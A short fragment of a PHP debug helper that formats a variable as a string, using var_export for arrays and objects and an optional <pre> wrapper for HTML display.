            $out = '';
            switch ($var) {
                case empty($var):
                    $out = '[empty value]';
                    break;

                case is_array($var):
                    $out = var_export($var, true);
                    break;

                case is_object($var):
                    $out = var_export($var, true);
                    break;

                case is_string($var):
                    $out = $var;
                    break;

                default:
                    $out = var_export($var, true);
                    break;
            }
            if (true === $html) {
              $out = "<pre>\n" . $out ."</pre>";
            }
            return $out;
        }
    }
